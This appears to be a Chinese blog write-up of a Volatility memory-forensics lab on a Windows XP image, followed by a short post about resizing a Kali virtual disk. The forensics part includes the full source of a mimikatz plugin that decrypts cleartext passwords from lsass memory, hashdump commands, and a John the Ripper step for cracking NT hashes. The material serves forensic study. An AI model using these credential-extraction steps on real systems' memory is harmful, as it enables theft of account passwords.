👉使用pslist查看内存镜像中进程列表 1python vol.py -f /root/桌面/suspicion/mem.vmem --profile=WinXPSP2x86 pslist 👉使用hiveliest查看内存中缓存的注册表信息，例如所有用户名、密码hash、病毒隐藏、恶意启动项、映射劫持。等 12python [vol.py](http://vol.py/) -f /root/桌面/suspicion/mem.vmem --profile=WinXPSP2x86 hivelistVolatility Foundation Volatility Framework 2.6.1 👉hivedump可以查看hivelist中列出的所有文件内容 hivedump -o offset -o的后面传递一个offset偏移量参数。是虚地址（内存地址） 1python vol.py -f /root/桌面/suspicion/mem.vmem --profile=WinXPSP2x86 hivedump -o 0xe16aab60 👉查看注册表中的某一项健值 printkey -K 路径 1python vol.py -f /root/桌面/suspicion/mem.vmem --profile=WinXPSP2x86 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot; 👉Winlogon健值查询在内存转储前，最后登录的账户是哪个 1python vol.py -f /root/桌面/suspicion/mem.vmem --profile=WinXPSP2x86 printkey -K &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; 👉取得用户密码的哈希值 hashdump -y system的偏移量 -s SAM的偏移量 1python vol.py -f /root/桌面/suspicion/mem.vmem --profile=WinXPSP2x86 hashdump -y 0xe1035b60 -s 0xe16aab60 这步失败了，没有提取出来密码的hash 👉使用mimikatz插件，获取用户明文密码 1sudo pip install construct==2.5.5-reupload mimikatz.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625# Volatility mimikatz plugin## Based on the research made by Gentil_Kiwi for his mimikatz# http://blog.gentilkiwi.com/mimikatz# https://code.google.com/p/mimikatz/## Author: Francesco Picasso &lt;francesco.picasso@gmail.com&gt;## This plugin is free software; you can redistribute it and/or modify# it under the terms of the GNU General Public License as published by# the Free Software Foundation; either version 2 of the License, or# (at your option) any later version.## This plugin is distributed in the hope that it will be useful,# but WITHOUT ANY WARRANTY; without even the implied warranty of# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the# GNU General Public License for more details.## You should have received a copy of the GNU General Public License# along with this plugin. If not, see &lt;http://www.gnu.org/licenses/&gt;.&quot;&quot;&quot;@author : Francesco Picasso@license : GPL 2 or later@contact : francesco.picasso@gmail.com@organization : www.realitynet.it&quot;&quot;&quot;import constructimport osimport reimport structimport volatility.obj as objimport volatility.debug as debugimport volatility.commands as commandsimport volatility.constants as constantsimport volatility.utils as utilsimport volatility.win32.tasks as tasksfrom Crypto.Cipher import AESfrom Crypto.Cipher import DES3#------------------------------------------------------------------------------class Credential(): &quot;&quot;&quot;TODO: add description here.&quot;&quot;&quot; def __init__(self, module=&#x27;&#x27;, username=&#x27;&#x27;, domain=&#x27;&#x27;, epwd=&#x27;&#x27;, pwd=&#x27;&#x27;): self.module = module self.username = username self.domain = domain self.epwd = epwd self.pwd = pwd self.signature = module + username + domain + epwd.encode(&#x27;hex&#x27;) def decrypt_epwd(self, decryptor): if self.epwd and decryptor: self.pwd = decryptor.decrypt(self.epwd) try: self.pwd = self.pwd.decode(&#x27;utf-16-le&#x27;).rstrip(&#x27;\\0&#x27;) except UnicodeDecodeError: debug.warning(&#x27;[Credential:decrypt_epwd] unicode decode error&#x27;) self.pwd = self.pwd.encode(&#x27;hex&#x27;) def dump(self): debug.notice(&#x27;m&lt;&#123;&#125;&gt; u&lt;&#123;&#125;&gt; d&lt;&#123;&#125;&gt; ep&lt;&#123;&#125;&gt; p&lt;&#123;&#125;&gt;&#x27;.format( self.module, self.username, self.domain, self.epwd.encode(&#x27;hex&#x27;), self.pwd))class Credentials(): &quot;&quot;&quot;TODO: add description here.&quot;&quot;&quot; def __init__(self): self.credentials = [] def add_credential(self, credential): already_in = False for cred in self.credentials: if cred.signature == credential.signature: already_in = True if not already_in: self.credentials.append(credential)#------------------------------------------------------------------------------class MemoryScanner(object): &quot;&quot;&quot;An address space scanner based on scudette&#x27;s Yara Scanner&quot;&quot;&quot; def __init__(self, task): self.task = task def _find_first(self, address_space, offset, maxlen, signature): &quot;&quot;&quot;Raw memory scanner with overlap.&quot;&quot;&quot; # Allow some bytes for overlapping signatures overlap = 1024 i = offset while i &lt; offset + maxlen: to_read = min( constants.SCAN_BLOCKSIZE + overlap, offset + maxlen - i) block = address_space.zread(i, to_read) if block: match = block.find(signature) if match &gt;= 0: return match i += constants.SCAN_BLOCKSIZE def find_first(self, offset, signature): &quot;&quot;&quot;Find the first match using VADs. It retuns a VA.&quot;&quot;&quot; task_as = self.task.get_process_address_space() task_vads = self.task.get_vads(skip_max_commit = True) for vad, __ in task_vads: if offset &gt;= vad.Start and offset &lt;= vad.Start + vad.Length: position = self._find_first(task_as, vad.Start, vad.Length, signature) if position: return position + vad.Start#------------------------------------------------------------------------------class MimikatzBase(object): &quot;&quot;&quot;The mimikatz base class, used to defined common attributes/methods.&quot;&quot;&quot; SIZEOF_LONG = 4 SIZEOF_PTR = None UNPACK_PTR = None UNPACK_LONG = &#x27;&lt;L&#x27; def __init__(self, task): self.task = task self.task_as = task.get_process_address_space() def get_ptr(self, pos): raw_data = self.task_as.zread(pos, self.SIZEOF_PTR) if raw_data: return struct.unpack(self.UNPACK_PTR, raw_data)[0] def get_data(self, pos, size): if pos and size: return self.task_as.zread(pos, size) return &#x27;&#x27;class Mimikatz_x86(MimikatzBase): &quot;&quot;&quot;The mimikatz x86 base class.&quot;&quot;&quot; SIZEOF_PTR = 4 UNPACK_PTR = &#x27;&lt;L&#x27; def __init__(self, task): MimikatzBase.__init__(self, task) MimikatzBase.__init__(self, task) def get_ptr_with_offset(self, pos): return self.get_ptr(pos)class Mimikatz_x64(MimikatzBase): &quot;&quot;&quot;The mimikatz x64 base class.&quot;&quot;&quot; SIZEOF_PTR = 8 UNPACK_PTR = &#x27;&lt;Q&#x27; def __init__(self, task): MimikatzBase.__init__(self, task) def get_ptr_with_offset(self, pos): raw_data = self.task_as.zread(pos, self.SIZEOF_LONG) if raw_data: ptr = struct.unpack(self.UNPACK_LONG, raw_data)[0] return pos + self.SIZEOF_LONG + ptr #------------------------------------------------------------------------------ class LsaDecryptor(): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; SIGNATURE = None IV_LENGTH = 16 PTR_IV_OFFSET = None PTR_AES_KEY_OFFSET = None PTR_DES_KEY_OFFSET = None UUUR_TAG = 0x55555552 MSSK_TAG = 0x4d53534b HARD_KEY = construct.Struct(&#x27;KIWI_HARD_KEY&#x27;, construct.ULInt32(&#x27;cbSecret&#x27;), construct.Field(&#x27;data&#x27;, lambda ctx: ctx.cbSecret)) # Modified to include HARD_KEY size. BCRYPT_KEY = construct.Struct(&#x27;KIWI_BCRYPT_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # &#x27;MSSK&#x27;. construct.ULInt32(&#x27;type&#x27;), construct.ULInt32(&#x27;unk0&#x27;), construct.ULInt32(&#x27;unk1&#x27;), construct.ULInt32(&#x27;unk2&#x27;), construct.ULInt32(&#x27;cbSecret&#x27;)) def __init__(self): self.iv = &#x27;&#x27; self.aes_key = &#x27;&#x27; self.des_key = &#x27;&#x27; def find_signature(self): for mod in self.task.get_load_modules(): if str(mod.BaseDllName).lower() == &#x27;lsasrv.dll&#x27;: scanner = MemoryScanner(self.task) return scanner.find_first(mod.DllBase.v(), self.SIGNATURE) debug.warning(&#x27;[LsaDecryptor:find_signature()] signature not found!&#x27;) def get_IV(self, pos): ptr_iv = self.get_ptr_with_offset(pos + self.PTR_IV_OFFSET) if ptr_iv: return self.get_data(ptr_iv, self.IV_LENGTH) def get_key(self, pos, key_offset): ptr_key = self.get_ptr_with_offset(pos + key_offset) if ptr_key: ptr_key = self.get_ptr(ptr_key) if ptr_key: size = self.BCRYPT_HANDLE_KEY.sizeof() data = self.get_data(ptr_key, size) if data: kbhk = self.BCRYPT_HANDLE_KEY.parse(data) if kbhk.tag == self.UUUR_TAG: ptr_key = kbhk.ptr_kiwi_bcrypt_key size = self.BCRYPT_KEY.sizeof() data = self.get_data(ptr_key, size) if data: kbk = self.BCRYPT_KEY.parse(data) if kbk.tag == self.MSSK_TAG: adjust = construct.ULInt32(&#x27;&#x27;).sizeof() size = kbk.cbSecret + adjust ptr_key = ptr_key + self.BCRYPT_KEY.sizeof() - adjust data = self.get_data(ptr_key, size) if data: khk = self.HARD_KEY.parse(data) return khk.data else: debug.warning(&#x27;get_key() unable to get HARD_KEY.&#x27;) else: debug.warning(&#x27;get_key() BCRYPT_KEY invalid tag&#x27;) else: debug.warning(&#x27;get_key() unable to read BCRYPT_KEY data.&#x27;) else: debug.warning(&#x27;get_key() BCRYPT_HANDLE_KEY invalid tag&#x27;) debug.warning(kbhk) else: debug.warning(&#x27;get_key() unable to read BCRYPT_HANDLE_KEY data.&#x27;) else: debug.warning(&#x27;get_key() unable to get BCRYPT_HANDLE_KEY pointer.&#x27;) else: debug.warning(&#x27;get_key()unable to get first pointer.&#x27;) def get_des_key(self, pos): return self.get_key(pos, self.PTR_DES_KEY_OFFSET) def get_aes_key(self, pos): return self.get_key(pos, self.PTR_AES_KEY_OFFSET) def acquire_crypto_material(self): sigpos = self.find_signature() if not sigpos: debug.warning(&#x27;[LsaDecryptor] unable to find signature!&#x27;) return self.iv = self.get_IV(sigpos) self.des_key = self.get_des_key(sigpos) self.aes_key = self.get_aes_key(sigpos) def decrypt(self, encrypted): # TODO: NT version specific, move from here in subclasses. cleartext = &#x27;&#x27; size = len(encrypted) if size: if size % 8: if not self.aes_key or not self.iv: return cleartext cipher = AES.new(self.aes_key, AES.MODE_CBC, self.iv) else: if not self.des_key or not self.iv: return cleartext cipher = DES3.new(self.des_key, DES3.MODE_CBC, self.iv[:8]) cleartext = cipher.decrypt(encrypted) return cleartext def dump(self): print &#x27;Dumping LSA Decryptor&#x27; print &#x27; IV (&#123;&#125;): &#123;&#125;&#x27;.format(len(self.iv), self.iv.encode(&#x27;hex&#x27;)) print &#x27;DES_KEY (&#123;&#125;): &#123;&#125;&#x27;.format( len(self.des_key), self.des_key.encode(&#x27;hex&#x27;)) print &#x27;AES_KEY (&#123;&#125;): &#123;&#125;&#x27;.format( len(self.aes_key), self.aes_key.encode(&#x27;hex&#x27;)) class LsaDecryptor_x86(LsaDecryptor, Mimikatz_x86): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; def __init__(self, lsass_task): Mimikatz_x86.__init__(self, lsass_task) LsaDecryptor.__init__(self)class LsaDecryptor_x64(LsaDecryptor, Mimikatz_x64): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; def __init__(self, lsass_task): Mimikatz_x64.__init__(self, lsass_task) LsaDecryptor.__init__(self)class LsaDecryptor_Vista_x86(LsaDecryptor_x86): &quot;&quot;&quot;Class for Windows Vista x86.&quot;&quot;&quot; # MIMIKATZ x86: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] SIGNATURE = &#x27;\\x8b\\xf0\\x3b\\xf3\\x7c\\x2c\\x6a\\x02\\x6a\\x10\\x68&#x27; PTR_IV_OFFSET = 11; PTR_AES_KEY_OFFSET = -15; PTR_DES_KEY_OFFSET = -70; BCRYPT_HANDLE_KEY = construct.Struct(&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # Tag &#x27;UUUR&#x27;, 0x55555552. construct.ULInt32(&#x27;ptr_void_algorithm&#x27;), construct.ULInt32(&#x27;ptr_kiwi_bcrypt_key&#x27;), construct.ULInt32(&#x27;ptr_unknown&#x27;)) def __init__(self, lsass_task): LsaDecryptor_x86.__init__(self, lsass_task)class LsaDecryptor_Win7_x86(LsaDecryptor_x86): &quot;&quot;&quot;Class for Windows 7 x86.&quot;&quot;&quot; # MIMIKATZ x86: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] SIGNATURE = &#x27;\\x8b\\xf0\\x3b\\xf3\\x7c\\x2c\\x6a\\x02\\x6a\\x10\\x68&#x27; PTR_IV_OFFSET = 11; PTR_AES_KEY_OFFSET = -15; PTR_DES_KEY_OFFSET = -70; BCRYPT_HANDLE_KEY = construct.Struct(&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # Tag &#x27;UUUR&#x27;, 0x55555552. construct.ULInt32(&#x27;ptr_void_algorithm&#x27;), construct.ULInt32(&#x27;ptr_kiwi_bcrypt_key&#x27;), construct.ULInt32(&#x27;ptr_unknown&#x27;)) def __init__(self, lsass_task): LsaDecryptor_x86.__init__(self, lsass_task)class LsaDecryptor_Vista_x64(LsaDecryptor_x64): &quot;&quot;&quot;Class for Vista x64.&quot;&quot;&quot; SIGNATURE = &#x27;\\x83\\x64\\x24\\x30\\x00\\x44\\x8b\\x4c\\x24\\x48\\x48\\x8b\\x0d&#x27; PTR_IV_OFFSET = 63; PTR_AES_KEY_OFFSET = 25; PTR_DES_KEY_OFFSET = -69; BCRYPT_HANDLE_KEY = construct.Struct(&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # Tag &#x27;UUUR&#x27;, 0x55555552. construct.ULInt64(&#x27;ptr_void_algorithm&#x27;), construct.ULInt64(&#x27;ptr_kiwi_bcrypt_key&#x27;), construct.ULInt64(&#x27;ptr_unknown&#x27;)) def __init__(self, lsass_task): LsaDecryptor_x64.__init__(self, lsass_task)class LsaDecryptor_Win7_x64(LsaDecryptor_x64): &quot;&quot;&quot;Class for Windows 7 x64.&quot;&quot;&quot; # MIMIKATZ x64: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] SIGNATURE = &#x27;\\x83\\x64\\x24\\x30\\x00\\x44\\x8b\\x4c\\x24\\x48\\x48\\x8b\\x0d&#x27; PTR_IV_OFFSET = 59; PTR_AES_KEY_OFFSET = 25; PTR_DES_KEY_OFFSET = -61; BCRYPT_HANDLE_KEY = construct.Struct(&#x27;KIWI_BCRYPT_HANDLE_KEY&#x27;, construct.ULInt32(&#x27;size&#x27;), construct.ULInt32(&#x27;tag&#x27;), # Tag &#x27;UUUR&#x27;, 0x55555552. construct.ULInt64(&#x27;ptr_void_algorithm&#x27;), construct.ULInt64(&#x27;ptr_kiwi_bcrypt_key&#x27;), construct.ULInt64(&#x27;ptr_unknown&#x27;)) def __init__(self, lsass_task): LsaDecryptor_x64.__init__(self, lsass_task)#------------------------------------------------------------------------------ class Wdigest(): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; SIGNATURE = None FIRST_ENTRY_OFFSET = 0 WDIGEST_LIST_ENTRY = None MODULE_NAME = &#x27;wdigest&#x27; MAX_WALK = 32 def __init__(self, credentials_obj): self.entries = [] self.entries_seen = &#123;&#125; self.credentials_obj = credentials_obj def find_signature(self): for mod in self.task.get_load_modules(): if str(mod.BaseDllName).lower() == &#x27;wdigest.dll&#x27;: scanner = MemoryScanner(self.task) return scanner.find_first(mod.DllBase.v(), self.SIGNATURE) debug.warning(&#x27;[Wdigest] no wdigest.dll found in lsass process!&#x27;) def get_entry_at(self, ptr): if ptr: size = self.WDIGEST_LIST_ENTRY.sizeof() data = self.get_data(ptr, size) if data: entry = self.WDIGEST_LIST_ENTRY.parse(data) return entry def get_first_entry(self): position = self.find_signature() if position: ptr_entry = self.get_ptr_with_offset(position + self.FIRST_ENTRY_OFFSET) if ptr_entry: ptr_entry = self.get_ptr(ptr_entry) if ptr_entry: entry = self.get_entry_at(ptr_entry) if entry: return entry, ptr_entry else: debug.warning(&#x27;[Wdigest] no wdigest package found.&#x27;) return None, None def get_unicode_string_at(self, ptr, size): data = self.get_data(ptr, size) if data: data_str = &#x27;&#x27; try: data_str = data.decode(&#x27;utf-16-le&#x27;).rstrip(&#x27;\\0&#x27;) except UnicodeDecodeError as ee: debug.error( &#x27;[Wdigest] get_unicode_string_at() unicode error &#123;&#125;&#x27;.format( ee)) debug.warning(&#x27;[Wdigest] src data is &lt;&#123;&#125;&gt;&#x27;.format(data_str)) return data_str else: debug.error(&#x27;[Wdigest] get_unicode_string_at() unable to get data&#x27;) return &#x27;&#x27; def add_entry(self, entry, found_at): if entry.usage_count: if entry.this_entry == found_at: user = domain = epwd = &#x27;&#x27; if entry.user_string_ptr and entry.user_len: user = self.get_unicode_string_at( entry.user_string_ptr, entry.user_max_len) if entry.domain_string_ptr and entry.domain_len: domain = self.get_unicode_string_at( entry.domain_string_ptr, entry.domain_max_len) if entry.password_encrypted_ptr and entry.password_len: epwd = data = self.get_data( entry.password_encrypted_ptr, entry.password_max_len) if user: cred_entry = Credential(self.MODULE_NAME, user, domain, epwd) self.credentials_obj.add_credential(cred_entry) def walk_entries(self): entry, found_at = self.get_first_entry() if entry: walk_num = 1 while walk_num &lt; self.MAX_WALK: self.add_entry(entry, found_at) self.entries_seen[found_at] = 1 found_at = entry.previous entry = self.get_entry_at(found_at) if not entry: debug.error(&#x27;Next entry not found!&#x27;) break if entry.this_entry in self.entries_seen: break walk_num += 1 class Wdigest_x86(Wdigest, Mimikatz_x86): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; WDIGEST_LIST_ENTRY = construct.Struct(&#x27;WdigestListEntry&#x27;, construct.ULInt32(&#x27;previous&#x27;), construct.ULInt32(&#x27;next&#x27;), construct.ULInt32(&#x27;usage_count&#x27;), construct.ULInt32(&#x27;this_entry&#x27;), construct.ULInt64(&#x27;luid&#x27;), construct.ULInt64(&#x27;flag&#x27;), construct.ULInt16(&#x27;user_len&#x27;), construct.ULInt16(&#x27;user_max_len&#x27;), construct.ULInt32(&#x27;user_string_ptr&#x27;), construct.ULInt16(&#x27;domain_len&#x27;), construct.ULInt16(&#x27;domain_max_len&#x27;), construct.ULInt32(&#x27;domain_string_ptr&#x27;), construct.ULInt16(&#x27;password_len&#x27;), construct.ULInt16(&#x27;password_max_len&#x27;), construct.ULInt32(&#x27;password_encrypted_ptr&#x27;)) def __init__(self, lsass_task, credentials_obj): Mimikatz_x86.__init__(self, lsass_task) Wdigest.__init__(self, credentials_obj)class Wdigest_x64(Wdigest, Mimikatz_x64): &quot;&quot;&quot;TODO: add description.&quot;&quot;&quot; WDIGEST_LIST_ENTRY = construct.Struct(&#x27;WdigestListEntry&#x27;, construct.ULInt64(&#x27;previous&#x27;), construct.ULInt64(&#x27;next&#x27;), construct.ULInt32(&#x27;usage_count&#x27;), construct.ULInt32(&#x27;align1&#x27;), construct.ULInt64(&#x27;this_entry&#x27;), construct.ULInt64(&#x27;luid&#x27;), construct.ULInt64(&#x27;flag&#x27;), construct.ULInt16(&#x27;user_len&#x27;), construct.ULInt16(&#x27;user_max_len&#x27;), construct.ULInt32(&#x27;align2&#x27;), construct.ULInt64(&#x27;user_string_ptr&#x27;), construct.ULInt16(&#x27;domain_len&#x27;), construct.ULInt16(&#x27;domain_max_len&#x27;), construct.ULInt32(&#x27;align3&#x27;), construct.ULInt64(&#x27;domain_string_ptr&#x27;), construct.ULInt16(&#x27;password_len&#x27;), construct.ULInt16(&#x27;password_max_len&#x27;), construct.ULInt32(&#x27;align4&#x27;), construct.ULInt64(&#x27;password_encrypted_ptr&#x27;)) def __init__(self, lsass_task, credentials_obj): Mimikatz_x64.__init__(self, lsass_task) Wdigest.__init__(self, credentials_obj)class Wdigest_Vista_x86(Wdigest_x86): &quot;&quot;&quot;Class for Windows Vista x86.&quot;&quot;&quot; SIGNATURE = &#x27;\\x74\\x11\\x8b\\x0b\\x39\\x4e\\x10&#x27; FIRST_ENTRY_OFFSET = -6 def __init__(self, lsass_task, credentials_obj): Wdigest_x86.__init__(self, lsass_task, credentials_obj)class Wdigest_Win7_x86(Wdigest_x86): &quot;&quot;&quot;Class for Windows 7 x86.&quot;&quot;&quot; SIGNATURE = &#x27;\\x74\\x11\\x8b\\x0b\\x39\\x4e\\x10&#x27; FIRST_ENTRY_OFFSET = -6 def __init__(self, lsass_task, credentials_obj): Wdigest_x86.__init__(self, lsass_task, credentials_obj)class Wdigest_Win7_x64(Wdigest_x64): &quot;&quot;&quot;Class for Windows 7 x64.&quot;&quot;&quot; SIGNATURE = &#x27;\\x48\\x3b\\xd9\\x74&#x27; FIRST_ENTRY_OFFSET = -4 def __init__(self, lsass_task, credentials_obj): Wdigest_x64.__init__(self, lsass_task, credentials_obj)class Wdigest_Vista_x64(Wdigest_x64): &quot;&quot;&quot;Class for Windows Vista x64.&quot;&quot;&quot; SIGNATURE = &#x27;\\x48\\x3b\\xd9\\x74&#x27; FIRST_ENTRY_OFFSET = -4 def __init__(self, lsass_task, credentials_obj): Wdigest_x64.__init__(self, lsass_task, credentials_obj)#------------------------------------------------------------------------------ class mimikatz(commands.Command): &quot;&quot;&quot;mimikatz offline&quot;&quot;&quot; def __init__(self, config, *args, **kwargs): commands.Command.__init__(self, config, *args, **kwargs) self.profile = config.get_value(&#x27;profile&#x27;) self.credentials_obj = Credentials() def find_lsass(self): addr_space = utils.load_as(self._config) for task in tasks.pslist(addr_space): if str(task.ImageFileName) == &#x27;lsass.exe&#x27;: return task def init_objects(self, lsass_task): lsa_decryptor = None wdigest = None if len(self.profile) &gt;= 7: arch = self.profile[-3:] sp = self.profile[-6:-3] os = self.profile[:-6] if os == &#x27;Vista&#x27;: if arch == &#x27;x86&#x27;: lsa_decryptor = LsaDecryptor_Vista_x86(lsass_task) wdigest = Wdigest_Vista_x86(lsass_task, self.credentials_obj) elif arch == &#x27;x64&#x27;: lsa_decryptor = LsaDecryptor_Vista_x64(lsass_task) wdigest = Wdigest_Vista_x64(lsass_task, self.credentials_obj) elif os == &#x27;Win7&#x27;: if arch == &#x27;x86&#x27;: lsa_decryptor = LsaDecryptor_Win7_x86(lsass_task) wdigest = Wdigest_Win7_x86(lsass_task, self.credentials_obj) elif arch == &#x27;x64&#x27;: lsa_decryptor = LsaDecryptor_Win7_x64(lsass_task) wdigest = Wdigest_Win7_x64(lsass_task, self.credentials_obj) else: pass return lsa_decryptor, wdigest def calculate(self): lsass_task = self.find_lsass() if not lsass_task: debug.error(&#x27;lsass_task process not found!!&#x27;) return lsa_decryptor, wdigest = self.init_objects(lsass_task) if not lsa_decryptor or not wdigest: return lsa_decryptor.acquire_crypto_material() wdigest.walk_entries() for cred in self.credentials_obj.credentials: cred.decrypt_epwd(lsa_decryptor) def render_text(self, outfd, data): self.table_header(outfd, [(&quot;Module&quot;, &quot;8&quot;), (&quot;User&quot;, &quot;16&quot;), (&quot;Domain&quot;, &quot;16&quot;), (&quot;Password&quot;, &quot;40&quot;)]) for cred in self.credentials_obj.credentials: self.table_row( outfd, cred.module, cred.username, cred.domain, cred.pwd) 把py放进volatility文件夹的plugins文件夹内 1python vol.py -f /root/桌面/suspicion/mem.vmem --profile=WinXPSP2x86 mimikatz 👉使用userassist命令可以获取到内存在转储前都运行了哪些程序，运行多少次，最后一次运行时间 👉使用memdump把某个程序的相关数据转储成一个文件，然后对这个文件进一步分析 memdump -p PID -D 转储文件的存放目录 ​ pslist获取PID 1python vol.py -f /root/桌面/suspicion/mem.vmem memdump -p 1736 -D mem 👉文件成功生成，用editor打开 👉用strings 命令提取文件中的字符串 1strings 1736.dmp|grep flag | more |grep flag 是以flag为关键词进行搜索 | more 是逐页显示搜索结果 👉使用cmdscan命令从转储内容中提取目标系统的命令行历史 1python vol.py -f /root/桌面/suspicion/mem.vmem --profile=WinXPSP2x86 cmdscan 👉使用netscan提取网络连接情况 👉使用iehistory提取使用IE浏览器访问网络情况 ​ volatility自带的是ie的，也可以下载其他的插件来提取其他浏览器的浏览记录 Tip：volatility入门指令12345Volatility -f name imageinfovolatility -f name pslist --profile=WinXPSP2x86 列举进程：volatility -f name --profile=WinXPSP2x86 volshelldt(&quot;_PEB&quot;) 查看进程环境块volatility -f name --profile=WinXPSP2x86 hivelist列举缓存在内存的注册表 ： hivedump打印出注册表中的数据 ： 1volatility -f name --profile=WinXPSP2x86 hivedump -o 注册表的 virtual 地址 显示每个进程的加载dll列表 1Volatility -f name -profile = Win7SP0x86 dlllist&gt; dlllist.txt 获取SAM表中的用户： 1volatility -f name --profile=WinXPSP2x86 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot; 登陆账户系统 1volatility -f name --profile=WinXPSP2x86 printkey -K &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; userassist键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等 1volatility -f name --profile=WinXPSP2x86 userassist 将内存中的某个进程数据以 dmp 的格式保存出来 1volatility -f name --profile=WinXPSP2x86 -p [PID] -D [dump 出的文件保存的目录] 提取内存中保留的 cmd 命令使用情况 1volatility -f name --profile=WinXPSP2x86 cmdscan 获取到当时的网络连接情况 1volatility -f name --profile=WinXPSP2x86 netscan 获取 IE 浏览器的使用情况 ： 1volatility -f name --profile=WinXPSP2x86 iehistory 获取内存中的系统密码，可以使用 hashdump 将它提取出来 123volatility -f name --profile=WinXPSP2x86 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）volatility -f name --profile=WinXPSP2x86 hashdump -y 0xe1035b60 -s 0xe16aab60volatility -f name --profile=WinXPSP2x86 timeliner 对文件查找及dumo提取某个进程： 123volatility -f name --profile=Win7SP1x64 memdump -D . -p 2872strings -e l ./2872.dmp | grep flagvolatility -f name --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -n --dump-dir=./ HASH匹配用户账户名密码： 1Hash, 然后使用john filename --format=NT破解 安全进程扫描 1volatility -f name --profile=Win7SP1x64 psscan Flag字符串扫描： 1strings -e l 2616.dmp | grep flag 查找图片： 12volatility -f name--profile=Win7SP1x64 filescan | grep -E &#x27;jpg|png|jpeg|bmp|gifvolatility -f name --profile=Win7SP1x64 netscan 注册表解析 12volatility -f name --profile=Win7SP1x64 hivelistvolatility -f name --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\\Control;&quot; 复制、剪切版： 12volatility -f name --profile=Win7SP1x64 clipboardvolatility -f name --profile=Win7SP1x64 dlllist -p 3820 Dump所有进程： 123volatility -f name --profile=Win7SP1x64 memdump -n chrome -D .利用字符串查找downloadpython vol.py -f name --profile=Win7SP1x86 shimcache svcscan查看服务 1python vol.py -f name --profile=Win7SP1x86 svcscan 123modules 查看内核驱动modscan、driverscan 可查看一些隐藏的内核驱动ShimCache来识别应用程序兼容性问题。跟踪文件路径，大小，最后修改时间和最后“执行”时间.","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"入侵检测与取证","slug":"实验/入侵检测与取证","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"取证","slug":"取证","permalink":"https://gryffinbit.top/tags/%E5%8F%96%E8%AF%81/"},{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"volatility","slug":"volatility","permalink":"https://gryffinbit.top/tags/volatility/"}],"author":"Gryffinbit"},{"title":"kali虚拟机扩容","slug":"kali虚拟机扩容","date":"2020-12-05T10:34:17.000Z","updated":"2024-11-12T06:59:30.000Z","comments":true,"path":"2020/12/05/kali虚拟机扩容/","permalink":"https://gryffinbit.top/2020/12/05/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9/","excerpt":"","text":"kali虚拟机扩容更改大小在VMware设置中扩展虚拟磁盘大小Hard Disk选项 在kali中调整分区/bin/sh /usr/lib/udisks2/udisks2-inhibit /usr/sbin/gpartedbin 调出图形界面的磁盘管理 最后启动更改 解决扩容后启动慢的问题在重建swap分区后，分区中的ID发生了变化，导致启动的时候找不到分区，需要等待。修复该问题，首先找到两个分区的UUID sudo blkid 修改配置文件，将UUID都替换为上面查询出来的UUID vim /etc/fstab 进行修改 vim /etc/initramfs-tools/conf.d/resume 进行修改 进行重建 sudo update-initramfs 